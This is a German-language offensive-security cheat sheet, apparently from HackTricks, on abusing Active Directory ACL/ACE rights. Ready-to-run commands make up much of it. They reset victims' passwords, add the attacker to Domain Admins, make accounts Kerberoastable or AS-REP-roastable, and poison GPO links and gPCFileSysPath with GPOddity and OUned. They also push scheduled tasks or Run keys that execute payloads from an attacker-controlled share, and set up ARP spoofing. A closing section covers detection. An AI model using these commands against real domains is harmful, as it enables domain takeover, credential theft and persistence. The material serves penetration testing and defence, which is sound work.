# Ausnutzen von Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Diese Seite fasst hauptsächlich die Techniken aus** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)** zusammen. Weitere Details findest du in den Originalartikeln.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

Informationen zum Ausnutzen von ACLs gelöschter Objekte und zur Reaktivierung von Konten findest du unter [Reaktivierung über den AD-Papierkorb](../privileged-groups-and-token-privileges.md#reanimating-a-deleted-account-through-delegated-acls).

## **GenericAll-Berechtigungen für Benutzer**

Diese Berechtigung gewährt einem Angreifer die vollständige Kontrolle über ein Zielbenutzerkonto. Sobald `GenericAll`-Berechtigungen mit dem Befehl `Get-ObjectAcl` bestätigt wurden, kann ein Angreifer:

- **Das Passwort des Ziels ändern**: Mit `net user <username> <password> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
- Unter Linux kann dasselbe über SAMR mit Samba `net rpc` erfolgen:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Wenn das Konto deaktiviert ist, entfernen Sie das UAC-Flag**: `GenericAll` ermöglicht das Bearbeiten von `userAccountControl`. Unter Linux kann BloodyAD das Flag `ACCOUNTDISABLE` entfernen:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Weise dem Benutzerkonto einen SPN zu, damit es kerberoastable wird, und verwende Rubeus und targetedKerberoast.py, um die Ticket-Granting-Ticket-(TGT-)Hashes zu extrahieren und zu versuchen, sie zu knacken.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Gezieltes ASREPRoasting**: Deaktiviere die Präauthentifizierung für den Benutzer, wodurch sein Konto für ASREPRoasting anfällig wird.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Mit `GenericAll` für einen Benutzer können Sie eine zertifikatbasierte Anmeldeinformation hinzufügen und sich als dieser Benutzer authentifizieren, ohne sein Passwort zu ändern. Siehe:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll-Rechte für eine Gruppe**

Dieses Privileg ermöglicht es einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte für eine Gruppe wie `Domain Admins` hat. Nachdem der Distinguished Name der Gruppe mit `Get-NetGroup` ermittelt wurde, kann der Angreifer:

- **Sich selbst zur Gruppe „Domain Admins“ hinzufügen**: Dies ist über direkte Befehle oder mithilfe von Modulen wie Active Directory oder PowerSploit möglich.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Von Linux aus kannst du BloodyAD auch nutzen, um dich beliebigen Gruppen hinzuzufügen, wenn du GenericAll/Write-Berechtigungen für deren Mitgliedschaften hast. Wenn die Zielgruppe in „Remote Management Users“ verschachtelt ist, erhältst du sofort WinRM-Zugriff auf Hosts, die diese Gruppe berücksichtigen:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Diese Rechte für ein Computerobjekt oder ein Benutzerkonto ermöglichen Folgendes:

- **Kerberos Resource-based Constrained Delegation**: Ermöglicht die Übernahme eines Computerobjekts.
- **Shadow Credentials**: Mit dieser Technik kann ein Computer- oder Benutzerkonto imitiert werden, indem die Rechte zum Erstellen von Shadow Credentials ausgenutzt werden.

## Ein Objekt in eine OU mit geerbten Berechtigungen verschieben

Ein Angriffsweg kann **Verschieberechte für ein Konto** mit **Schreibrechten kombinieren, die von einer Ziel-OU geerbt werden** – selbst wenn keiner der Principals das Konto zunächst hinsichtlich seiner sensiblen Attribute ändern kann. Überprüfe die Verschiebeberechtigungen des Quellobjekts und `CreateChild` für das Ziel, verschiebe das Objekt und prüfe anschließend erneut seine effektive DACL. Zum Beispiel verschiebt `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` in powerview.py den Benutzer. Eine kontrollierte Gruppe mit geerbtem `GenericWrite` für diese OU kann dann ein [shadow credential](shadow-credentials.md) hinzufügen. Durch das Verschieben selbst wird das geerbte Recht nicht erstellt.<sup>[[18]](#references)</sup>

Wenn du `GenericAll` für eine OU, aber keine geeignete geerbte ACE hast, kann `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` eine ACE für deren Nachkommen hinzufügen. Teste das Zielkonto separat: **Bei durch AdminSDHolder geschützten Konten ist die Vererbung deaktiviert**, daher kann eine OU-ACE gewöhnliche Benutzer betreffen, bei einem geschützten Benutzer jedoch wirkungslos sein. Siehe [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Ein separater Angriffsweg besteht, wenn ein privilegiertes geplantes Bereinigungsskript OUs anhand von durch Angreifer beeinflussbaren ACEs auswählt und anschließend für deren Nachkommen `Set-ADObject -Clear adminCount` **und** `$acl.SetAccessRuleProtection($False, $False)` ausführt. Wenn du die DACL der OU ändern kannst, gewähre der vom Skript geprüften Gruppe die erforderliche `ExtendedRight`- oder `GenericAll`-ACE. Prüfe außerdem separat, ob du die Aufgabe auslösen kannst. Die privilegierte Aufgabe kann dann die Vererbung für ein zuvor geschütztes Konto wieder aktivieren, sodass die OU-ACE angewendet wird. Überprüfe das genaue Skript, die Berechtigung zum Auslösen und die resultierende DACL. Das Löschen von `adminCount` allein aktiviert die Vererbung nicht wieder, und SDProp kann Konten, die weiterhin geschützten Gruppen angehören, erneut schützen.<sup>[[18]](#references)</sup>

## **WriteProperty on Group**

Wenn ein Benutzer für alle Objekte einer bestimmten Gruppe (z. B. `Domain Admins`) `WriteProperty`-Rechte hat, kann er:

- **Sich selbst zur Domain Admins-Gruppe hinzufügen**: Dies lässt sich durch die Kombination der Befehle `net user` und `Add-NetGroupUser` erreichen und ermöglicht eine Privilegieneskalation innerhalb der Domäne.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) für Gruppe**

Dieses Privileg ermöglicht es Angreifern, sich selbst zu bestimmten Gruppen wie `Domain Admins` hinzuzufügen, indem sie Befehle verwenden, die die Gruppenmitgliedschaft direkt ändern. Mit der folgenden Befehlsfolge können sie sich selbst hinzufügen:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Ein ähnliches Privileg ermöglicht Angreifern, sich direkt zu Gruppen hinzuzufügen, indem sie Gruppeneigenschaften ändern, sofern sie das Recht `WriteProperty` für diese Gruppen besitzen. Die Überprüfung und Ausübung dieses Privilegs erfolgt mit:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Das Besitzen des `ExtendedRight` für `User-Force-Change-Password` auf einem Benutzer ermöglicht das Zurücksetzen des Passworts, ohne das aktuelle Passwort zu kennen. Die Überprüfung dieses Rechts und dessen Ausnutzung können über PowerShell oder alternative Befehlszeilentools erfolgen. Dabei stehen mehrere Methoden zum Zurücksetzen des Passworts eines Benutzers zur Verfügung, darunter interaktive Sitzungen und Einzeiler für nicht-interaktive Umgebungen. Die Befehle reichen von einfachen PowerShell-Aufrufen bis zur Verwendung von `rpcclient` unter Linux und veranschaulichen die Vielseitigkeit der Angriffsvektoren.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner für eine Gruppe**

Wenn ein Angreifer feststellt, dass er `WriteOwner`-Rechte für eine Gruppe besitzt, kann er die Gruppe als Eigentümer übernehmen. Besonders folgenreich ist dies bei der Gruppe `Domain Admins`, da der Eigentümerwechsel eine umfassendere Kontrolle über Gruppenattribute und die Mitgliedschaft ermöglicht. Dazu wird das richtige Objekt mit `Get-ObjectAcl` ermittelt und anschließend der Eigentümer mit `Set-DomainObjectOwner` geändert, entweder anhand der SID oder des Namens.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite für einen Benutzer**

Diese Berechtigung ermöglicht es einem Angreifer, Benutzereigenschaften zu ändern. Mit `GenericWrite`-Zugriff kann der Angreifer insbesondere den Anmeldeskriptpfad eines Benutzers ändern, damit bei der Benutzeranmeldung ein bösartiges Skript ausgeführt wird. Dazu wird der Befehl `Set-ADObject` verwendet, um die Eigenschaft `scriptpath` des Zielbenutzers so zu ändern, dass sie auf das Skript des Angreifers verweist.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Ein enger gefasstes `WriteProperty`-ACE, das auf das [`scriptPath`-Attribut](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) des Benutzers beschränkt ist, kann ausreichen; `GenericWrite` ist nicht erforderlich. Kombinieren Sie dieses Attributrecht mit einem beschreibbaren Skript im `SYSVOL\<domain>\scripts`- oder `NETLOGON`-Verzeichnis der Domäne und prüfen Sie anschließend, ob sich der Zielbenutzer wahrscheinlich anmeldet und das Skript erreicht. Das Skript wird bei der Anmeldung im Kontext dieses Benutzers ausgeführt. Prüfen Sie die effektiven AD- und Datei-/Freigabe-ACLs separat; ein passendes Allow-ACE oder ein beschreibbares Verzeichnis allein weist den vollständigen Pfad nicht nach.

## **GenericWrite on Group**

Mit diesem Privileg können Angreifer die Gruppenmitgliedschaft manipulieren, beispielsweise indem sie sich selbst oder andere Benutzer zu bestimmten Gruppen hinzufügen. Dazu wird ein Credential-Objekt erstellt und verwendet, um Benutzer zu einer Gruppe hinzuzufügen oder aus ihr zu entfernen. Anschließend werden die Änderungen der Mitgliedschaft mit PowerShell-Befehlen überprüft.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Von Linux aus kann Samba `net` Mitglieder hinzufügen/entfernen, wenn du `GenericWrite` für die Gruppe hast (nützlich, wenn PowerShell/RSAT nicht verfügbar sind):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Der Besitz eines AD-Objekts und `WriteDACL`-Berechtigungen darauf ermöglichen es einem Angreifer, sich selbst `GenericAll`-Berechtigungen für das Objekt zu gewähren. Dies wird durch ADSI-Manipulation erreicht und ermöglicht die vollständige Kontrolle über das Objekt sowie die Änderung seiner Gruppenmitgliedschaften. Allerdings gibt es Einschränkungen beim Versuch, diese Berechtigungen mithilfe der Cmdlets `Set-Acl` / `Get-Acl` des Active Directory-Moduls auszunutzen.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Schnelle Übernahme mit WriteDACL/WriteOwner (PowerView)

Wenn du `WriteOwner` und `WriteDacl` über ein Benutzer- oder Dienstkonto hast, kannst du die vollständige Kontrolle übernehmen und mit PowerView das Passwort zurücksetzen, ohne das alte Passwort zu kennen:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Hinweise:
- Möglicherweise musst du zuerst den Besitzer auf dich selbst ändern, wenn du nur `WriteOwner` hast:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Überprüfen Sie den Zugriff nach dem Zurücksetzen des Passworts mit einem beliebigen Protokoll (SMB/LDAP/RDP/WinRM).

## **Replikation in der Domäne (DCSync)**

Der DCSync-Angriff nutzt bestimmte Replikationsberechtigungen in der Domäne, um einen Domain Controller nachzuahmen und Daten, einschließlich Benutzeranmeldedaten, zu synchronisieren. Diese leistungsstarke Technik erfordert Berechtigungen wie `DS-Replication-Get-Changes`, mit denen Angreifer sensible Informationen aus der AD-Umgebung extrahieren können, ohne direkten Zugriff auf einen Domain Controller zu haben.<sup>[[5]](#references)</sup> [**Erfahren Sie hier mehr über den DCSync-Angriff.**](../dcsync.md)

## GPO-Delegierung <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-Delegierung

Delegierter Zugriff zur Verwaltung von Group Policy Objects (GPOs) kann erhebliche Sicherheitsrisiken bergen. Wenn einem Benutzer wie `offense\spotless` beispielsweise Rechte zur GPO-Verwaltung delegiert werden, kann er über Berechtigungen wie **WriteProperty**, **WriteDacl** und **WriteOwner** verfügen. Diese Berechtigungen können für böswillige Zwecke missbraucht werden, wie mithilfe von PowerView ermittelt werden kann: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO-Berechtigungen aufzählen

Um falsch konfigurierte GPOs zu identifizieren, lassen sich die Cmdlets von PowerSploit miteinander verketten. So können GPOs ermittelt werden, die ein bestimmter Benutzer verwalten darf: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer, auf die eine bestimmte Richtlinie angewendet wird**: Es ist möglich zu ermitteln, für welche Computer eine bestimmte GPO gilt, um den möglichen Wirkungsbereich besser einzuschätzen. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Auf einen bestimmten Computer angewendete Richtlinien**: Um zu sehen, welche Richtlinien auf einen bestimmten Computer angewendet werden, können Befehle wie `Get-DomainGPO` verwendet werden.

**OUs, auf die eine bestimmte Richtlinie angewendet wird**: Die von einer bestimmten Richtlinie betroffenen Organisationseinheiten (OUs) lassen sich mit `Get-DomainOU` ermitteln.

Sie können auch das Tool [**GPOHound**](https://github.com/cogiceo/GPOHound) verwenden, um GPOs aufzuzählen und darin Probleme zu finden.

### GPO missbrauchen – New-GPOImmediateTask

Falsch konfigurierte GPOs lassen sich ausnutzen, um Code auszuführen, beispielsweise durch das Erstellen einer sofortigen geplanten Aufgabe. Damit kann ein Benutzer auf den betroffenen Rechnern zur lokalen Administratorengruppe hinzugefügt und seine Berechtigungen erheblich erweitert werden:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy-Modul – GPO missbrauchen

Das GroupPolicy-Modul ermöglicht, sofern es installiert ist, die Erstellung und Verknüpfung neuer GPOs sowie das Festlegen von Einstellungen wie Registry-Werten, um Backdoors auf betroffenen Computern auszuführen. Bei dieser Methode muss die GPO aktualisiert werden und sich ein Benutzer am Computer anmelden, damit sie ausgeführt wird:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Missbrauch von GPOs

SharpGPOAbuse bietet eine Möglichkeit, vorhandene GPOs zu missbrauchen, indem Aufgaben hinzugefügt oder Einstellungen geändert werden, ohne neue GPOs erstellen zu müssen. Dieses Tool setzt voraus, dass vorhandene GPOs geändert oder mit RSAT-Tools neue erstellt werden, bevor Änderungen angewendet werden können:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Richtlinienaktualisierung erzwingen

GPO-Updates erfolgen üblicherweise etwa alle 90 Minuten. Um diesen Prozess zu beschleunigen, insbesondere nach einer Änderung, kann auf dem Zielcomputer der Befehl `gpupdate /force` verwendet werden, um sofort eine Richtlinienaktualisierung zu erzwingen. Dadurch werden Änderungen an GPOs angewendet, ohne auf den nächsten automatischen Aktualisierungszyklus warten zu müssen.

### Unter der Haube

Bei der Überprüfung der geplanten Aufgaben einer bestimmten GPO, etwa der `Misconfigured Policy`, lässt sich das Hinzufügen von Aufgaben wie `evilTask` bestätigen. Diese Aufgaben werden mithilfe von Skripten oder Befehlszeilentools erstellt, die das Systemverhalten ändern oder Berechtigungen erweitern sollen.

Die Struktur der Aufgabe, wie sie in der von `New-GPOImmediateTask` generierten XML-Konfigurationsdatei dargestellt wird, beschreibt die Einzelheiten der geplanten Aufgabe, einschließlich des auszuführenden Befehls und seiner Auslöser. Diese Datei zeigt, wie geplante Aufgaben innerhalb von GPOs definiert und verwaltet werden, und ermöglicht die Ausführung beliebiger Befehle oder Skripte im Rahmen der Richtlinienanwendung.

### Benutzer und Gruppen

GPOs ermöglichen auch die Manipulation der Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch die direkte Bearbeitung der Richtliniendateien für Benutzer und Gruppen können Angreifer Benutzer zu privilegierten Gruppen hinzufügen, etwa zur lokalen Gruppe `administrators`. Dies ist durch die Delegierung von GPO-Verwaltungsberechtigungen möglich, die das Ändern von Richtliniendateien erlaubt, um neue Benutzer hinzuzufügen oder Gruppenmitgliedschaften zu ändern.

Die XML-Konfigurationsdatei für Benutzer und Gruppen beschreibt, wie diese Änderungen umgesetzt werden. Durch das Hinzufügen von Einträgen zu dieser Datei können bestimmten Benutzern auf betroffenen Systemen erweiterte Berechtigungen gewährt werden. Diese Methode bietet einen direkten Weg zur Rechteausweitung durch die Manipulation von GPOs.

Überprüfen Sie bei Sicherheitseinstellungen wie der Mitgliedschaft in lokalen Gruppen und Benutzerrechten auch die angewendete GPO-Vorlage unter `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` sowie die ACL des Verzeichnisses `SecEdit`. Ein beschreibbares Verzeichnis oder eine beschreibbare Datei ist ein Hinweis, der überprüft werden sollte: Ob eine Änderung wirksam werden kann, hängt davon ab, welche Zugriffsrechte die SYSVOL-Freigabe tatsächlich gewährt, welche verweigernden und geerbten ACLs gelten, welche Berechtigungen der Gruppenrichtliniencontainer hat, wie die Richtlinie zugewiesen ist und ob der Client sie aktualisiert. Die Mitgliedschaft in einer Gruppe namens „GPO Managers“ allein belegt keine Bearbeitungsrechte. [Microsoft dokumentiert diesen Vorlagenpfad sowie die Trennung zwischen Gruppenrichtliniencontainer und -vorlage.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Darüber hinaus kommen weitere Methoden zur Codeausführung oder zum Aufrechterhalten von Persistenz infrage, etwa die Nutzung von Anmelde- und Abmeldeskripten, die Änderung von Registrierungsschlüsseln für Autoruns, die Installation von Software über .msi-Dateien oder die Bearbeitung von Dienstkonfigurationen. Diese Techniken bieten verschiedene Möglichkeiten, durch den Missbrauch von GPOs Zugriff aufrechtzuerhalten und Zielsysteme zu kontrollieren.

### GPC-/GPT-Abruf auf authentifizierte Rogue-Dienste umleiten

Eine GPO besteht aus einem LDAP-**Group Policy Container (GPC)** mit Metadaten und einem über SMB bereitgestellten **Group Policy Template (GPT)** mit den Richtliniendateien. Bei der Aktualisierung folgt der Client dem `gPLink`, liest den referenzierten GPC und dessen `gPCFileSysPath` und lädt anschließend das GPT von diesem UNC-Pfad herunter. Daher kann Schreibzugriff auf den GPC selbst oder auf den `gPLink` einer OU, Site oder Domain dazu genutzt werden, eine privilegierte Richtlinienverarbeitung auszulösen.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Vergiftung von `gPCFileSysPath` mit GPOddity

Wenn der kontrollierte Prinzipal Schreibzugriff auf den Ziel-GPC hat (direkt oder über **NTLM relay to LDAP**), kann `gPCFileSysPath` durch einen vom Angreifer gehosteten UNC-Pfad ersetzt werden. [GPOddity](https://github.com/synacktiv/GPOddity) automatisiert die LDAP-Änderung und stellt ein bösartiges GPT mit modulbasierten Richtliniendateien oder einer Immediate Task bereit, die der Group Policy-Client als `NT AUTHORITY\SYSTEM` ausführt.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Eine anonyme SMB-Freigabe oder eine SMB-Freigabe, die keine Anmeldeinformationen voraussetzt, reicht bei aktuellen Windows-Clients nicht aus: SMB Secure Negotiate erfordert einen Nachweis, dass die Authentifizierung erfolgreich war. Daher muss der Rogue-Dienst die Domain-Identität validieren, den SMB-Sitzungsschlüssel ableiten und seine Antworten korrekt signieren. Konfigurieren Sie GPOddity im Embedded-Modus mit einem kontrollierten Computerkonto und dessen Dienstschlüssel und wählen Sie anschließend im Abschnitt `[COMMANDS]` eine computer- oder benutzerseitige Payload aus.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**GPO-Sonderfall:** Auch nach MS16-072 erstellt Windows weiterhin zwei SMB2-Sitzungen innerhalb derselben TCP-Verbindung: Die Benutzersitzung liest `GPT.INI`, anschließend liest die Sitzung des Computerkontos die effektive Konfiguration, etwa `ScheduledTasks.xml`. Ein rogue server muss daher Authentifizierungsstatus, Sitzungsschlüssel und Signaturschlüssel anhand der SMB2-`SessionId` und nicht nur anhand des Sockets indizieren. Der in GPOddity/OUned eingebettete Scapy-Fork implementiert dies mit `SMBStreamSocketMultiplexing` und einem Multiplexing-fähigen `SMBServer`; Server mit nur einer Sitzung, die Impacket/Scapy verwenden, nutzen sonst den falschen Signaturstatus wieder und scheitern bei Benutzer-Policies.<sup>[[15]](#references)</sup>

#### gPLink poisoning mit OUned

Mit `WriteGPLink`, `GenericWrite` oder gleichwertiger Kontrolle über eine OU, Site oder Domäne kann ein Angreifer einen Link hinzufügen, dessen GPC-DN von einem LDAP-Host unter Kontrolle des Angreifers bereitgestellt wird. Diese Methode wurde ursprünglich von Petros Koutroumpis vorgestellt; [OUned](https://github.com/synacktiv/OUned) automatisiert den LDAP-Schreibvorgang sowie die bösartige GPC/GPT-Kette.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Das Opfer authentifiziert sich zunächst beim rogue LDAP-Dienst und erhält eine GPC, deren `gPCFileSysPath` auf den rogue SMB-Dienst verweist. Anschließend authentifiziert es sich bei SMB und wendet das bereitgestellte GPT an. OUned benötigt daher ein Konto mit einem LDAP-SPN, ein Maschinenkonto mit einem HOST-SPN für SMB (dasselbe Maschinenkonto kann beide Anforderungen erfüllen) sowie eine DNS-Auflösung oder Reverse-Weiterleitung, die Ports 389 und 445 an den Host des Operators weiterleitet.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUneds eingebetteter Scapy-LDAP-Server validiert Kerberos/SPNEGO mit dem echten kontrollierten Dienstschlüssel und stellt beliebige GPC-Daten aus JSON bereit. Der leere JSON-Schlüssel bildet rootDSE ab, `base64:`-Präfixe kennzeichnen Binärwerte, und der Server unterstützt Add/Delete/Modify/Search sowie `BASE`-, `LEVEL`- und `SUBTREE`-Suchen; er kann ohne Schutz sowie mit Integritäts- oder Vertraulichkeitsschutz aushandeln. Dadurch lässt sich der Dienst wiederverwenden, wenn eine andere Windows-Komponente einem vom Angreifer kontrollierten LDAP-Verweis folgt, aber auf authentifiziertem LDAP besteht.<sup>[[15]](#references)</sup>

Gehe nicht davon aus, dass das Synchronisieren eines Kontopassworts in eine Dummy-Domäne alle Kerberos-Schlüssel reproduziert: RC4 wird aus dem Passwort abgeleitet, während AES string-to-key außerdem einen Salt verwendet, der sich aus dem Hostnamen und der Domäne des Principals ableitet. Wenn du den tatsächlichen AES-Schlüssel des Kontos an `KerberosSSP` übergibst, musst du RC4 nicht durch eine erkennbare Änderung an `msDS-SupportedEncryptionTypes` des Maschinenkontos erzwingen, auf das es selbst schreiben kann.<sup>[[15]](#references)</sup>

#### Erkennungsschwerpunkte

Korreliere Änderungen an `gPCFileSysPath` oder `gPLink` mit Änderungen an der GPO-Version und neuen Immediate-/Scheduled-Task-XML-Dateien. Untersuche Verknüpfungen mit unerwarteten Naming Contexts, UNC-Hosts außerhalb der genehmigten DC-/SYSVOL-Gruppe, DNS-Einträge, die Maschinennamen umleiten, LDAP-/CIFS-Service-Tickets für ungewöhnliche Maschinenkonten sowie Änderungen an `msDS-SupportedEncryptionTypes`, durch die RC4 aktiviert wird.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

Mit `WriteGPLink` für eine OU/Domäne kannst du das Attribut `gPLink` des Zielcontainers ändern und **erzwingen, dass eine vorhandene GPO angewendet wird**, ohne die GPO selbst zu bearbeiten. Das ist interessant, wenn die verknüpfte GPO bereits auf entfernte Inhalte über **UNC-Pfade** (`\\HOST\share\...`) verweist, da authentifizierte Benutzer **SYSVOL** lesen und offline nach wiederverwendbaren Richtlinien suchen können.<sup>[[11]](#references)</sup>

Ablauf auf hoher Ebene:

1. Ermittle mit BloodHound einen Principal mit `WriteGPLink` für eine OU und liste Computer/Benutzer innerhalb dieser OU auf.
2. Erstelle eine schreibgeschützte Kopie von `SYSVOL` und analysiere die GPOs auf **Software Installation**, **Laufwerkszuordnungen** (`Drives.xml`) und **Anmelde-/Startskripte**, die auf UNC-Pfade verweisen.
3. Bevorzuge Richtlinien, die auf einen **direkten Hostnamen** verweisen (zum Beispiel `\\DC02\share\pkg.msi`), statt auf DFS-/Domänennamensraumpfade, da sich hostnamenbasierte Pfade leichter per L2-Spoofing umleiten lassen.
4. Füge die GUID der ausgewählten GPO an `gPLink` der Ziel-OU an, damit der Computer des Opfers diese bereits vorhandene Richtlinie verarbeitet.
5. Führe im selben Broadcast-Domain ARP-Spoofing für den UNC-Host aus und binde dessen IP lokal (`ip addr add <target_ip>/32 dev <iface>`), damit der SMB-Datenverkehr des Opfers deinen Host erreicht.
6. Stelle den erwarteten Pfad/Dateinamen über einen SMB-Server des Angreifers bereit (zum Beispiel `smbserver.py`) und warte auf die normale Richtlinienverarbeitung.

Beispiel für die Erfassung von `SYSVOL` und die Korrelation von GPOs:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
